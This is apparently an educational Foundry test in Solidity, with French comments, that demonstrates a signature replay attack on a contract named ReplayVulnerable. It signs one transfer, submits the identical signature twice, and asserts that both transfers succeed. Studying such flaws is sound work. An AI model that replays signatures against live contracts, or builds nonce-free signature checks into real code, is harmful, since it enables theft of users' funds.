
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {ReplayVulnerable} from "../src/ReplayVulnerable.sol";

contract ReplayVulnerableTest is Test {

    ReplayVulnerable replay;

    uint256 alicePrivateKey = 0xA11CE;
    address alice;
    address bob;

    function setUp() public {
        alice = vm.addr(alicePrivateKey);
        bob = makeAddr("Bob");

        // Déployer le contrat depuis l'adresse Alice
        vm.prank(alice);
        replay = new ReplayVulnerable();
    }

    function test_ReplayAttack() public {

        uint256 amount = 100;

        // Créer le message
        bytes32 messageHash = keccak256(
            abi.encodePacked(alice, bob, amount)
        );

        // Signer le message avec la clé privée d'Alice
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(alicePrivateKey, messageHash);

        // Première utilisation de la signature
        replay.transferWithSignature(
            alice, bob, amount, v, r, s
        );

        assertEq(replay.balances(alice), 900);
        assertEq(replay.balances(bob), 100);

        // Réutilisation exacte de la même signature
        replay.transferWithSignature(
            alice, bob, amount, v, r, s
        );

        assertEq(replay.balances(alice), 800);
        assertEq(replay.balances(bob), 200);
    }
}

